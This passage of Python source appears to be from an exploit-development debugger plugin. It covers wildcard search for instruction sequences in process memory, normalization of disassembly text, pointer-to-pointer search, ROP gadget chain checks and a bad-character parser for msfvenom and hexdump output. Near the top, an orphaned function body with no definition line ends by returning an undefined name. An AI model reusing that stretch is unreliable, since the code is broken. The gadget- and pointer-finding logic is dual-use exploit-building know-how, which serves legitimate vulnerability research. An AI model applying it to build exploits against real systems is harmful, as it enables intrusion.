		p = normalizeInstructionText(pattern_instr)
		d = normalizeInstructionText(disasm_instr)
		if p == d:
			return True

		if "r32" in p:
			for reg in Registers32BitsOrder:
				reg_l = str(reg).strip().lower()
				if normalizeInstructionText(p.replace("r32", reg_l)) == d:
					return True

		if "r64" in p:
			for reg in Registers64BitsOrder:
				reg_l = str(reg).strip().lower()
				if normalizeInstructionText(p.replace("r64", reg_l)) == d:
					return True

		return False

	# wildcard-aware sequential matching
	# * = skip zero or more disassembly lines until the next instruction matches
	wildcard_open = False
	matched_sequence = list(first_pattern)

	idx = 0
	while idx < len(remaining_parts):
		entry = remaining_parts[idx]

		if entry["type"] == "wildcard":
			wildcard_open = True
			idx += 1
			continue

		pattxt = entry["text"]

		if wildcard_open:
			found = False
			wildcard_lines = []

			while pos < len(disasm_lines):
				if instructionMatches(pattxt, disasm_lines[pos]):
					# include all skipped wildcard instructions
					matched_sequence.extend(wildcard_lines)
					# include the matching instruction itself
					matched_sequence.append(disasm_lines[pos])
					pos += 1
					wildcard_open = False
					found = True
					break

				wildcard_lines.append(disasm_lines[pos])
				pos += 1

			if not found:
				return False, []
		else:
			if pos >= len(disasm_lines):
				return False, []

			if instructionMatches(pattxt, disasm_lines[pos]):
				matched_sequence.append(disasm_lines[pos])
				pos += 1
			else:
				return False, []

		idx += 1

	return True, matched_sequence



	if instr is None:
		return ""

	instr = instr.strip().lower()

	# collapse whitespace
	instr = re.sub(r"\s+", " ", instr)

	# normalize spaces around commas
	instr = re.sub(r"\s*,\s*", ",", instr)

	# normalize spaces around + and - inside brackets later
	# but first convert WinDBG-style hex numbers like 10h, -10h, +10h
	def repl_hex(m):
		sign = m.group(1) or ""
		hexpart = m.group(2).lower()
		return sign + "0x" + hexpart

	instr = re.sub(r"(?<![0-9a-z_])([+-]?)([0-9a-f]{2,})h\b", repl_hex, instr)

	# normalize decimal displacements/immediates after + or -
	# example: [ebp-8] -> [ebp-0x8], [eax+4] -> [eax+0x4]
	def repl_signed_dec(m):
		sign = m.group(1)
		num = int(m.group(2), 10)
		return sign + "0x%x" % num

	instr = re.sub(r"([+-])([0-9]+)\b", repl_signed_dec, instr)

	# normalize bare hex addresses/immediates if already 0x... => lowercase
	instr = re.sub(r"\b0x([0-9a-fA-F]+)\b", lambda m: "0x" + m.group(1).lower(), instr)

	# remove spaces around + and - inside memory references
	def normalize_bracket_expr(m):
		expr = m.group(1)
		expr = re.sub(r"\s+", "", expr)
		return "[" + expr + "]"

	instr = re.sub(r"\[([^\]]+)\]", normalize_bracket_expr, instr)

	# final whitespace cleanup
	instr = re.sub(r"\s+", " ", instr).strip()

	return inst



def normalizeInstructionText(instr):
	if instr is None:
		return ""

	instr = str(instr).strip().lower()
	if instr == "":
		return ""

	# normalize whitespace
	instr = instr.replace("\t", " ")
	instr = re.sub(r"\s+", " ", instr).strip()

	# normalize spaces around commas
	instr = re.sub(r"\s*,\s*", ",", instr)

	# normalize ptr qualifier spacing, but do not remove them yet
	instr = re.sub(r"\bbyte\s+ptr\b", "byte ptr", instr)
	instr = re.sub(r"\bword\s+ptr\b", "word ptr", instr)
	instr = re.sub(r"\bdword\s+ptr\b", "dword ptr", instr)
	instr = re.sub(r"\bfword\s+ptr\b", "fword ptr", instr)
	instr = re.sub(r"\bqword\s+ptr\b", "qword ptr", instr)
	instr = re.sub(r"\btbyte\s+ptr\b", "tbyte ptr", instr)
	instr = re.sub(r"\bxmmword\s+ptr\b", "xmmword ptr", instr)
	instr = re.sub(r"\bymmword\s+ptr\b", "ymmword ptr", instr)
	instr = re.sub(r"\bzmmword\s+ptr\b", "zmmword ptr", instr)

	# normalize segment prefix spacing, but keep them for now
	instr = re.sub(r"\b(cs|ds|es|fs|gs|ss):\s+\[", r"\1:[", instr)
	instr = re.sub(r"\b(cs|ds|es|fs|gs|ss):\s*", r"\1:", instr)

	# convert WinDBG-style hex constants:
	#   10h    -> 0x10
	#   -10h   -> -0x10
	#   +10h   -> +0x10
	# preserve leading zeros: 0BF5C73A5h -> 0x0bf5c73a5
	def _replace_hex_h(m):
		sign = m.group(1) or ""
		num = m.group(2).lower()
		return sign + "0x" + num

	instr = re.sub(r"(?<![0-9a-z_])([+-]?)([0-9a-f]{2,})h\b", _replace_hex_h, instr)

	# normalize existing 0x... values to lowercase only, preserve leading zeros
	instr = re.sub(r"\b0x([0-9a-fA-F]+)\b", lambda m: "0x" + m.group(1).lower(), instr)

	# normalize memory expressions inside brackets only
	def _normalize_brackets(m):
		expr = m.group(1).strip()

		# remove all whitespace inside brackets
		expr = re.sub(r"\s+", "", expr)

		# convert signed decimal displacements to hex, but do not touch scale factors
		# [ebp-8]       -> [ebp-0x8]
		# [eax+4]       -> [eax+0x4]
		# [eax+ecx*4+8] -> [eax+ecx*4+0x8]
		expr = re.sub(
			r'(?<!\*)([+-])([0-9]+)\b',
			lambda x: x.group(1) + "0x%x" % int(x.group(2), 10),
			expr
		)

		# convert leading decimal constant inside brackets too
		# [4+eax] -> [0x4+eax]
		expr = re.sub(
			r'(^|[+\-])([0-9]+)(?=($|[+\-*]))',
			lambda x: x.group(1) + "0x%x" % int(x.group(2), 10),
			expr
		)

		# clean up repeated signs
		expr = expr.replace("+-", "-")
		expr = expr.replace("-+", "-")
		expr = expr.replace("++", "+")
		expr = expr.replace("--", "+")

		return "[" + expr + "]"

	instr = re.sub(r"\[([^\]]+)\]", _normalize_brackets, instr)

	# normalize signed decimal immediates after comma only
	# cmp eax,-1 -> cmp eax,-0x1
	# do not convert unsigned decimal immediates automatically
	instr = re.sub(
		r'(?<=,)([+-])([0-9]+)\b',
		lambda m: m.group(1) + "0x%x" % int(m.group(2), 10),
		instr
	)

	# simplify memory operands:
	# - remove ptr qualifiers
	# - remove cs/ds/es/ss prefixes
	# - keep fs/gs intact
	# Examples:
	#   movs dword ptr es:[edi],dword ptr [esi] -> movs [edi],[esi]
	#   mov eax,dword ptr ds:[ebp-0x10]         -> mov eax,[ebp-0x10]
	#   mov eax,dword ptr fs:[0x30]             -> mov eax,fs:[0x30]
	instr = re.sub(
		r"\b(byte|word|dword|fword|qword|tbyte|xmmword|ymmword|zmmword)\s+ptr\s+",
		"",
		instr
	)

	# remove cs/ds/es/ss prefixes, but preserve fs/gs
	instr = re.sub(r"\b(cs|ds|es|ss):", "", instr)

	# final cleanup
	instr = re.sub(r"\s+", " ", instr).strip()
	instr = re.sub(r"\s*,\s*", ",", instr)

	return instr




def findPatternWild(modulecriteria,criteria,pattern,base,top,patterntype):
	"""
	Performs a search for instructions, accepting wildcards
	
	Arguments :
	modulecriteria - dictionary with criteria modules need to comply with.
	criteria - dictionary with criteria the pointers need to comply with.
	pattern - the pattern to search for.
	base - the base address in memory the search should start at
	top - the top address in memory the search should not go beyond
	patterntype - type of search to conduct (str or bin)
	"""
	
	global silent	
	
	rangestosearch = []
	tmpsearch = []
	
	allpointers = {}
	results = {}
	
	mindistance = 4
	maxdistance = 40
	
	if "mindistance" in criteria:
		mindistance = criteria["mindistance"]
	if "maxdistance" in criteria:
		maxdistance = criteria["maxdistance"]
	
	maxdepth = 8
	
	preventbreak = True
	
	if "all" in criteria:
		preventbreak = False
	
	if "depth" in criteria:
		maxdepth = criteria["depth"]
	
	if not silent:
		dbg.log("[+] Type of search: %s" % patterntype)
		dbg.log("[+] Searching for matches up to %d instructions deep" % maxdepth)
		dbg.log("[+] Criteria in use: %s" % criteriaToText(modulecriteria))

		if patterntype == "str":
			checkKeystone()
			dbg.log("")

	if len(modulecriteria) > 0:
		modulestosearch = getModulesToQuery(modulecriteria)
		# convert modules to ranges
		for modulename in modulestosearch:
			objmod = MnModule(modulename)
			mBase = objmod.moduleBase
			mTop = objmod.moduleTop
			if mBase < base and base < mTop:
				mBase = base
			if mTop > top:
				mTop = top
			if mBase >= base and mBase < top:
				if not [mBase,mTop] in rangestosearch:
					rangestosearch.append([mBase,mTop])
		# if no modules were specified, then also add  the other ranges (outside modules)
		if not "modules" in modulecriteria:
			outside = getRangesOutsideModules()
			for range in outside:
				mBase = range[0]
				mTop = range[1]
				if mBase < base and base < mTop:
					mBase = base
				if mTop > top:
					mTop = top
				if mBase >= base and mBase < top:
					if not [mBase,mTop] in rangestosearch:
						rangestosearch.append([mBase,mTop])
	else:
		# parse through all pages and look for the ones, within the range to search, that meet the access criteria
		allpages = dbg.getMemoryPages()
		desiredacl = criteria["accesslevel"]
		desiredacl_human = ""
		if desiredacl in MnProc.memProtConstants:
			desiredacl_human = "(%s)" % MnProc.memProtConstants[desiredacl][0]
		dbg.log("")
		dbg.log("[+] Filtering applicable pages")
		dbg.log("    Desired Access Control: %s %s" % (desiredacl, desiredacl_human))
		for opage in allpages.keys():
			pageaddress = opage
			thispage = allpages[opage]
			pagebegin = thispage.getBaseAddress()
			pageend = pagebegin + thispage.getSize()
			if pagebegin >= base and pageend <= top:
				pageaccess = thispage.getAccess(human=True)
				compatible_pageacl = False
				if not "accesslevel" in criteria:
					compatible_pageacl = True
				else:
					if desiredacl == "*":
						compatible_pageacl = True
					else:
						desiredacl_str = MnProc.memProtConstants[desiredacl][0]
						if pageaccess.startswith(desiredacl_str):
							compatible_pageacl = True
				if compatible_pageacl:
					dbg.log("    Adding page at 0x%08x to scope, ACL: %s" % (pageaddress, pageaccess))
					rangestosearch.append([pagebegin, pageend])
				else:
					dbgp("    Skipping page at 0x%08x to scope, ACL: %s" % (pageaddress, pageaccess))
		#rangestosearch.append([base,top])
	
	pattern = pattern.replace("'","").replace('"',"").replace("  "," ").replace(", ",",").replace(" ,",",").replace("# ","#").replace(" #","#")
	if len(pattern) == 0:
		dbg.log("** Invalid search pattern **")
		return


	parsed = parseInstructionWildcardSearch(pattern, mindistance, maxdistance)
	dbg.log("")
	dbg.log("[+] Parsed input and found %d initial instructions to search" % len(parsed["first_patterns"]))
	for first_pattern in parsed["first_patterns"]:
		dbg.log("    Searching for %s" % first_pattern)
		for ranges in rangestosearch:
			interruptMona()
			mBase = ranges[0]
			mTop = ranges[1]
			# convert the first_pattern sequence to a bytesequence
			instrseq = b""
			for first_pattern_instruction in first_pattern:
				buf = dbg.assemble(first_pattern_instruction)
				dbgp("        %s -> %s" % (first_pattern_instruction, bin2hex(buf)))
				instrseq += buf
			# when providing bytes already,  it expects a desc/bytes tuple
			first_pattern_flat = ";".join(first_pattern)
			pointers = searchInRange([(first_pattern_flat, instrseq)], mBase, mTop, criteria)
			nrfound = 0
			for ptrkeys in pointers:
				nrfound += len(pointers[ptrkeys])
			if nrfound > 0:
				dbg.log("    Found %d pointers to '%s' in 0x%08x-0x%08x" % (nrfound, first_pattern_flat, mBase, mTop))
			for instrkey in pointers:
				# keep results keyed by the actual pattern we searched for
				if not instrkey in allpointers:
					allpointers[instrkey] = list(pointers[instrkey])
				else:
					allpointers[instrkey].extend(pointers[instrkey])

				# de-duplicate while preserving order to keep counts accurate
				if len(allpointers[instrkey]) > 1:
					seen_ptrs = set()
					deduped = []
					for p in allpointers[instrkey]:
						if p not in seen_ptrs:
							seen_ptrs.add(p)
							deduped.append(p)
					allpointers[instrkey] = deduped


	totalfound = 0
	for allkeys in allpointers:
		totalfound += len(allpointers[allkeys])
	# for each of the findings, see if it contains the other instructions too
	# disassemble forward up to 'maxdepth' instructions
	startmoment = time.time()
	ptrcnt = 0
	nrhits = 0
	flipovermax = 1000
	flipover = 0
	if totalfound > 20000:
		flipovermax = 2000
	elif totalfound > 10000:
		flipovermax = 1000
	elif totalfound > 1000:
		flipovermax = 100
	if totalfound > 0:
		if not silent:
			dbg.log("")
			dbg.log("[+] Lauching forward disassembly on %d pointers (%d different instruction type(s)). This may take a while" % (totalfound, len(allpointers)))
	startcounter = 1
	for ptrtypes in allpointers:
		if not silent:
			dbg.log("    Seq %d/%d, start instruction '%s', exploring %d locations" % (startcounter, len(allpointers), ptrtypes, len(allpointers[ptrtypes])))
		startcounter += 1
		for thisptr in allpointers[ptrtypes]:
			thisdisam = ""
			try:
				for depth in xrange(maxdepth):
					nextaddress = dbg.disasmForward(thisptr, depth)
					tinstr = getDisasmInstruction(nextaddress).lower() + "\n"
					tinstr = normalizeInstructionText(tinstr) + "\n"
					if tinstr != "???":
						thisdisam += tinstr
					else:
						thisdisam = ""
						break	
			except Exception as e:
				dbg.log("    Error: %s" % str(e))
				continue
			allfound = True
			thisdisam = thisdisam.strip("\n")
			dbgp("Disassembly at %s: " % (PTR_PRINT % thisptr))
			dbgp("%s" % thisdisam)
			ptrcnt += 1
			flipover += 1
			if flipover > flipovermax:
				eta = get_eta(startmoment, ptrcnt, totalfound)

				if totalfound > 0:
					perc = (ptrcnt * 100.0) / totalfound
				else:
					perc = 0.0

				dbg.log("    Update: ETA: %s (%d/%d, %.2f%%) - nr of results so far: %d" %
						(eta, ptrcnt, totalfound, perc, nrhits))

				flipover = 0
			matched, matched_sequence = doesForwardDisasmMatch(parsed, ptrtypes, thisdisam)
			#matched, matched_sequence = doesForwardDisasmMatch(parsed, first_pattern_flat, thisdisam)
			if matched:
				full_instr = "#".join(matched_sequence)
				if not full_instr in results:
					results[full_instr] = []
				results[full_instr].append(thisptr)
				nrhits += 1

	return results



def wouldBreakChain(instruction):
	"""
	Checks if the given instruction would potentially break the instruction chain
	Argument :
	instruction:  the instruction to check
	
	Returns :
	boolean 
	"""
	goodinstruction = isGoodGadgetInstr(instruction)
	if goodinstruction:
		return False
	return True


def findPattern(modulecriteria,criteria,pattern,ptype,base,top,consecutive=False,rangep2p=0,level=0,poffset=0,poffsetlevel=0):
	"""
	Performs a find in memory for a given pattern
	
	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	criteria - dictionary with criteria the pointers need to comply with.
				One of the criteria can be "p2p", indicating that the search should look for
				pointers to pointers to the pattern
	pattern - the pattern to search for.
	ptype - the type of the pattern, can be 'asc', 'bin', 'ptr', 'instr' or 'file'
		If no type is specified, the routine will try to 'guess' the types
		when type is set to file, it won't actually search in memory for pattern, but it will
		read all pointers from that file and search for pointers to those pointers
		(so basically, type 'file' is only useful in combination with -p2p)
	base - the base address in memory the search should start at
	top - the top address in memory the search should not go beyond
	consecutive - Boolean, indicating if consecutive pointers should be skipped
	rangep2p - if not set to 0, the pointer to pointer search will also look rangep2p bytes back for each pointer,
			thus allowing you to find close pointer to pointers
	poffset - only used when doing p2p, will add offset to found pointer address before looking to ptr to ptr
	poffsetlevel - apply the offset at this level of the chain
	level - number of levels deep to look for ptr to ptr. level 0 is default, which means search for pointer to searchpattern
	
	Return:
	all pointers (or pointers to pointers) to the given search pattern in memory
	"""

	wildcardsearch = False
	rangestosearch = []
	tmpsearch = []
	p2prangestosearch = []
	global silent	
	if len(modulecriteria) > 0:
		modulestosearch = getModulesToQuery(modulecriteria)
		# convert modules to ranges
		for modulename in modulestosearch:
			objmod = MnModule(modulename)
			mBase = objmod.moduleBase
			mTop = objmod.moduleTop
			if mBase < base and base < mTop:
				mBase = base
			if mTop > top:
				mTop = top
			if mBase >= base and mBase < top:
				if not [mBase,mTop] in rangestosearch:
					rangestosearch.append([mBase,mTop])
		# if no modules were specified, then also add  the other ranges (outside modules)
		if not "modules" in modulecriteria:
			outside = getRangesOutsideModules()
			for range in outside:
				mBase = range[0]
				mTop = range[1]
				if mBase < base and base < mTop:
					mBase = base
				if mTop > top:
					mTop = top
				if mBase >= base and mBase < top:
					if not [mBase,mTop] in rangestosearch:
						rangestosearch.append([mBase,mTop])
	else:
		rangestosearch.append([base,top])
	
	tmpsearch.append([0,TOP_USERLAND])
	
	allpointers = {}
	originalPattern = pattern
	
	# guess the type if it is not specified
	if ptype == "":
		if len(pattern) > 2 and pattern[0:2].lower() == "0x":
			ptype = "ptr"
		elif "\\x" in pattern:
			ptype = "bin"
		else:
			ptype = "asc"

	if ptype == "bin" and ".." in pattern:
		wildcardsearch = True
		if not silent:
			dbg.log("    - Wildcard \\x.. detected")
			
	if "unic" in criteria and ptype == "asc":
		ptype = "bin"
		binpat = ""
		pattern = pattern.replace('"',"")
		for thischar in pattern:
			binpat += "\\x" + str(toHexByte(_ord(thischar))) + "\\x00"
		pattern = binpat
		originalPattern += " (unicode)"
		if not silent:
			dbg.log("    - Expanded ascii pattern to unicode, switched search mode to bin")

	bytes = ""
	patternfilename = ""
	split1 = re.compile(' ')		
	split2 = re.compile(':')
	split3 = re.compile("\*")		
	
	if not silent:
		dbg.log("    - Treating search pattern as %s" % ptype)
		
	if ptype == "ptr":
		pattern = pattern.replace("0x","")
		value = int(pattern,16)
		bytes = struct.pack('<I',value)
	elif ptype == "bin":
		if len(pattern) % 2 != 0:
			dbg.log("Invalid hex pattern", highlight=1)
			return
		if not wildcardsearch:
			bytes = hex2bin(pattern)
		else:
			# check if first byte is a byte and not a wildcard
			if len(pattern) > 3 and pattern[2:4] == "..":
				dbg.log(" *** Can't start a wildcard search with a wildcard. Specify a byte instead ***",highlight =1)
				return
			else:
				# search for the first byte and then check wildcards later
				foundstartbytes = False
				sindex = 0
				while not foundstartbytes:
					b = pattern[sindex:sindex+4]
					if not ".." in b:
						bytes += hex2bin(pattern[sindex:sindex+4])
					else:
						foundstartbytes = True
					sindex += 4

	elif ptype == "asc":
		if pattern.startswith('"') and pattern.endswith('"'):
			pattern = pattern.replace('"',"")
		elif pattern.startswith("'") and pattern.endswith("'"):
			pattern = pattern.replace("'","")
		bytes = pattern
	elif ptype == "instr":
		pattern = pattern.replace("'","").replace('"',"").replace("  "," ").replace(", ",",").replace(" #","#").replace("# ","#")
		silent = True
		bytes = hex2bin(assemble(pattern,""))
		silent = False
		if bytes == "":
			dbg.log("Invalid instruction - could not assemble %s" % pattern,highlight=1)
			return
	elif ptype == "file":
		patternfilename = pattern.replace("'","").replace('"',"")
		dbg.log("    - Search patterns = all pointers in file %s" % patternfilename)
		dbg.log("      Extracting pointers...")
		FILE=open(patternfilename,"r")
		contents = FILE.readlines()
		FILE.close()
		extracted = 0	
		for thisLine in contents:
			if thisLine.lower().startswith("0x"):
				lineparts=split1.split(thisLine)
				thispointer = lineparts[0]
				#get type  = from : to *
				if len(lineparts) > 1:
					subparts = split2.split(thisLine)
					if len(subparts) > 1:
						if subparts[1] != "":
							subsubparts = split3.split(subparts[1])
							if not subsubparts[0] in allpointers:
								allpointers[subsubparts[0]] = [hexStrToInt(thispointer)]
							else:
								allpointers[subsubparts[0]] += [hexStrToInt(thispointer)]
							extracted += 1
		dbg.log("      %d pointers extracted." % extracted)							
	dbg.updateLog()
	
	fakeptrcriteria = {}
	
	fakeptrcriteria["accesslevel"] = "*"
	
	if "p2p" in criteria or level > 0:
		#save range for later, search in all of userland for now
		p2prangestosearch = rangestosearch
		rangestosearch = tmpsearch
	
	if ptype != "file":
		for ranges in rangestosearch:
			mBase = ranges[0]
			mTop = ranges[1]
			dbgp("Searching from 0x%s to 0x%s" % (toHex(mBase),toHex(mTop)))
			dbg.updateLog()
			searchPattern = []
			searchPattern.append([originalPattern, bytes])
			oldsilent=silent
			silent=True
			pointers = searchInRange(searchPattern,mBase,mTop,criteria)
			silent=oldsilent
			allpointers = mergeOpcodes(allpointers,pointers)
	
	# filter out bad ones if wildcardsearch is enabled
	if wildcardsearch and ptype == "bin":
		nrbytes = ( len(pattern) / 4) - len(bytes)
		if nrbytes > 0:
			maskpart = pattern[len(bytes)*4:]
			tocomparewith_tmp = maskpart.split("\\x")
			tocomparewith = []
			for tcw in tocomparewith_tmp:
				if len(tcw) == 2:
					tocomparewith.append(tcw)
			dbg.log("[+] Applying wildcard mask, %d remaining bytes: %s" % (nrbytes,maskpart))
			remptrs = {} 
			for ptrtype in allpointers:
				for ptr in allpointers[ptrtype]:
					rfrom = ptr + len(bytes)
					bytesatlocation = dbg.readMemory(rfrom,nrbytes)
					#dbg.log("Read %d bytes from 0x%08x" % (len(bytesatlocation),rfrom))
					compareindex = 0
					wildcardmatch = True
					for thisbyte in bytesatlocation:
						thisbytestr = bin2hexstr(thisbyte).replace("\\x","")
						thisbytecompare = tocomparewith[compareindex]
						if thisbytecompare != ".." and thisbytestr.lower() != thisbytecompare.lower():
							wildcardmatch=False
							break
						compareindex += 1
					if wildcardmatch:
						if not ptrtype in remptrs:
							remptrs[ptrtype] = [ptr]
						else:
							remptrs[ptrtype].append(ptr)

			allpointers = remptrs

	if ptype == "file" and level == 0:
		level = 1
		
	if consecutive:
		# get all pointers and sort them
		rawptr = {}
		for ptrtype in allpointers:
			for ptr in allpointers[ptrtype]:
				if not ptr in rawptr:
					rawptr[ptr]=ptrtype
		if not silent:
			dbg.log("[+] Number of pointers to process : %d" % len(rawptr))
		sortedptr = list(rawptr.items())
		sortedptr.sort(key = itemgetter(0))
		#skip consecutive ones and increment size
		consec_delta = len(bytes)
		previousptr = 0
		savedptr = 0
		consec_size = 0
		allpointers = {}
		for ptr,ptrinfo in sortedptr:
			if previousptr == 0:
				previousptr = ptr
				savedptr = ptr
			if previousptr != ptr:
				if ptr <= (previousptr + consec_delta):
					previousptr = ptr
				else:
					key = ptrinfo + " ("+ str(previousptr+consec_delta-savedptr) + ")"
					if not key in allpointers:
						allpointers[key] = [savedptr]
					else:
						allpointers[key] += [savedptr]
					previousptr = ptr
					savedptr = ptr

	#recursive search ? 
	if len(allpointers) > 0:
		remainingpointers = allpointers
		if level > 0:
			thislevel = 1
			while thislevel <= level:
				if not silent:
					pcnt = 0
					for ptype,ptrs in remainingpointers.items():
						for ptr in ptrs:					
							pcnt += 1
					dbg.log("[+] %d remaining types found at this level, total of %d pointers" % (len(remainingpointers),pcnt))				
				dbg.log("[+] Looking for pointers to pointers, level %d..." % thislevel)
				poffsettxt = ""
				if	thislevel == poffsetlevel:
					dbg.log("    I will apply offset %d (decimal) to discovered pointers to pointers..." % poffset)
					poffsettxt = "%d(%xh)" % (poffset,poffset)
				dbg.updateLog()
				searchPattern = []
				foundpointers = {}
				for ptype,ptrs in remainingpointers.items():
					for ptr in ptrs:
						cnt = 0
						#if thislevel == poffsetlevel:
						#	ptr = ptr + poffset
						while cnt <= rangep2p:
							bytes = struct.pack('<I',ptr-cnt)
							if ptype == "file":
								originalPattern = ptype
							if cnt == 0:
								searchPattern.append(["ptr" + poffsettxt + " to 0x" + toHex(ptr) +" (-> ptr to " + originalPattern + ") ** ", bytes])
							else:
								searchPattern.append(["ptr" + poffsettxt + " to 0x" + toHex(ptr-cnt) +" (-> close ptr to " + originalPattern + ") ** ", bytes])	
							cnt += 1
							#only apply rangep2p in level 1
							if thislevel == 1:
								rangep2p = 0
				remainingpointers = {}
				for ranges in p2prangestosearch:
					mBase = ranges[0]
					mTop = ranges[1]
					dbgp("Searching from 0x%s to 0x%s" % (toHex(mBase),toHex(mTop)))
					dbg.updateLog()
					oldsilent = silent
					silent=True
					pointers = searchInRange(searchPattern,mBase,mTop,fakeptrcriteria)
					silent=oldsilent
					for ptrtype in pointers:
						if not ptrtype in remainingpointers:
							if poffsetlevel == thislevel:
								# fixup found pointers, apply offset now
								ptrlist = []
								for thisptr in pointers[ptrtype]:
									thisptr = thisptr + poffset
									ptrlist.append(thisptr)
								pointers[ptrtype] = ptrlist
							remainingpointers[ptrtype] = pointers[ptrtype]
				thislevel += 1
				if len(remainingpointers) == 0:
					dbgp("[+] No more pointers left, giving up...", highlight=1)
					break
		allpointers = remainingpointers

	return allpointers
		

#-----------------------------------------------------------------------#
# mona compare magic
#-----------------------------------------------------------------------#


def compareFormattedFileWithMemory(filename,format,startpos,skipmodules=False,findunicode=False):

	isDebug=False

	def out(x): 
		dbg.log(x)
			
	def ok(x): dbg.log("[+] " + x) 
	def verbose(x):
		if isDebug:
			dbg.log("[dbg] " + x)

	def warn(x): dbg.log("[?] " + x, highlight=1)
	def err(x): dbg.log(x, highlight=1)

	#Class ported from https://github.com/mgeeky/expdevBadChars, author: mgeeky, Mariusz B.
	#Ported by: onlylonly, Z.Y Liew
	class BytesParser(object):
		formats_rex = {
			'xxd': r'^[^0-9a-f]*[0-9a-f]{2,}\:\s((?:[0-9a-f]{4}\s)+)\s+.+$',
			'hexdump': r'^[^0-9a-f]*[0-9a-f]{2,}\s+([0-9a-f\s]+[0-9a-f])$',
			'classic-hexdump': r'^[0-9a-f]*[0-9a-f]{2,}(?:\:|\s)+\s([0-9a-f\s]+)\s{2,}.+$',
			'hexdump-C': r'^[0-9a-f]*[0-9a-f]{2,}\s+\s([0-9a-f\s]+)\s*\|',
			'escaped-hexes': r'^[^\'"]*((?:\'[\\\\x0-9a-f]{8,}\')|(?:"[\\\\x0-9a-f]{8,}"))',
			'hexstring': r'^([0-9a-f]+)$',
			'msfvenom-powershell': r'^[^0x]+((?:0x[0-9a-f]{1,2},?)+)$',
			'byte-array': r'^[^0x]*((?:0x[0-9a-f]{2}(?:,\s?))+)',
			'js-unicode': r'^[^%u0-9a-f]*((?:%u[0-9a-f]{4})+)$',
			'dword': r'^(?:((?:0x[0-9a-f]{1,8}\s[<>\w\+]+)|(?:0x[0-9a-f]{1,8})):\s*)?((?:0x[0-9a-f]{8},?\s*)+)$',
		}

		formats_aliases = {
			'classic-hexdump': ['ollydbg'],
			'escaped-hexes': ['msfvenom-ruby', 'msfvenom-c', 'msfvenom-carray', 'msfvenom-python'],
			'dword': ['gdb']
		}

		formats_compiled = {}

		def __init__(self, input_data, name=None, format=None):
			self.name = name
			self.bytes = []
			self.parsed = False
			self.format = None

			# Preserve raw input bytes, but also keep a text form for regex processing.
			if isinstance(input_data, bytes):
				self.input_bytes = input_data
				self.input = _to_text(input_data)
			elif isinstance(input_data, list):
				# Supports old behavior where input may be a list of chars/strings/ints
				tmp = []
				for x in input_data:
					if isinstance(x, int):
						tmp.append(chr(x))
					else:
						tmp.append(_to_text(x))
				self.input = ''.join(tmp)
				self.input_bytes = _to_bytes(self.input)
			else:
				self.input = _to_text(input_data)
				self.input_bytes = _to_bytes(self.input)

			BytesParser.compile_regexps()

			if format:
				verbose("Using user-specified format: %s" % format)

				try:
					self.format = BytesParser.interpret_format_name(format)
				except Exception as e:
					verbose(str(e))

				assert (format in BytesParser.formats_rex or self.format is not None or str(format).lower() == "raw"), \
					"Format '%s' is not implemented." % format

				if self.format is None:
					self.format = format
			else:
				self.recognize_format()

			# do not normalize input on raw format to prevent input tampering
			if str(self.format).lower() != "raw":
				self.normalize_input()

			if not self.format:
				self.parsed = False
			else:
				if self.fetch_bytes():
					ok("Fetched %d bytes successfully from %s" % (len(self.bytes), self.name))
					self.parsed = True
				else:
					if format and len(format):
						err("Could not parse %s with user-specified format: %s" % (self.name, format))
					else:
						err("Recognized input %s as formatted with %s but failed fetching bytes." %
							(self.name, self.format))

		def normalize_input(self):
			out = []
			for line in self.input.split('\n'):
				line = line.strip()
				line2 = BytesParser.escape_string(line)
				out.append(line2)
			self.input = '\n'.join(out)

		@staticmethod
		def escape_string(s):
			# Python 2/3 compatible replacement for encode('string-escape')
			if isinstance(s, bytes):
				s = _to_text(s)
			return s.encode('unicode_escape').decode('ascii')

		@staticmethod
		def interpret_format_name(name):
			if str(name).lower() == "raw":
				return "raw"

			for k, v in BytesParser.formats_aliases.items():
				if name.lower() in v:
					return k
			raise Exception("Format name: %s not recognized as alias." % name)

		@staticmethod
		def compile_regexps():
			if len(BytesParser.formats_compiled) == 0:
				for name, rex in BytesParser.formats_rex.items():
					BytesParser.formats_compiled[name] = re.compile(rex, re.I)

		@staticmethod
		def make_line_printable(line):
			if isinstance(line, bytes):
				line = _to_text(line)
			return ''.join([c if c in string.printable else '.' for c in line])

		def recognize_format(self):
			for line in self.input.split('\n'):
				if self.format:
					break
				for format_name, rex in BytesParser.formats_compiled.items():
					line_printable = BytesParser.make_line_printable(line)

					verbose("Trying format %s on ('%s')" % (format_name, line_printable))

					if rex.match(line_printable):
						ok("%s has been recognized as %s formatted." % (self.name, format_name))
						self.format = format_name
						break

			if not self.format:
				if not all(chr(_ord(c)) in string.printable for c in self.input_bytes):
					ok("%s has been recognized as RAW bytes." % (self.name))
					self.format = 'raw'
					return True
				else:
					err("Could not recognize input bytes format of the %s!" % self.name)
					return False

			return (len(self.format) > 0)

		@staticmethod
		def post_process_bytes_line(line):
			outb = []
			l = line.strip()[:]
			strip = ['0x', ',', ' ', '\\', 'x', '%u', '+', '.', "'", '"']
			for s in strip:
				l = l.replace(s, '')

			for i in xrange(0, len(l), 2):
				outb.append(int(l[i:i+2], 16))
			return outb

		@staticmethod
		def preprocess_bytes_line(line):
			l = line.strip()[:]
			strip = ['(byte)', '+', '.']
			for s in strip:
				l = l.replace(s, '')
			return l

		@staticmethod
		def unpack_dword(line):
			outs = ''
			i = 0

			for m in re.finditer(r'((?:0x[0-9a-f]{8}(?!:),?\s*))', line):
				l = m.group(0)
				l = l.replace(',', '')
				l = l.replace(' ', '')
				dword = int(l, 16)
				unpack = reversed([
					(dword & 0xff000000) >> 24,
					(dword & 0x00ff0000) >> 16,
					(dword & 0x0000ff00) >> 8,
					(dword & 0x000000ff)
				])
				i += 4
				for b in unpack:
					outs += '%02x' % b

			verbose("After callback ('%s')" % outs)
			return BytesParser.formats_compiled['hexstring'].match(outs)

		def fetch_bytes(self):
			if not self.format:
				err("fetch_bytes(): Format has not been specified!")
				return False

			if self.format == 'raw':
				verbose("Parsing %s as raw bytes." % self.name)
				self.bytes = [_ord(c) for c in self.input_bytes]
				return len(self.bytes) > 0

			for line in self.input.split('\n'):
				callback_called = False
				if self.format in BytesParser.formats_callbacks and BytesParser.formats_callbacks[self.format]:
					verbose("Before callback ('%s')" % line)
					m = BytesParser.formats_callbacks[self.format].__func__(line)
					callback_called = True
				else:
					line = BytesParser.preprocess_bytes_line(line[:])
					m = BytesParser.formats_compiled[self.format].match(line)

				if m:
					extract = ''
					for mg in m.groups():
						if mg:
							extract = mg
					bytes_line = BytesParser.post_process_bytes_line(extract)
					if not bytes_line:
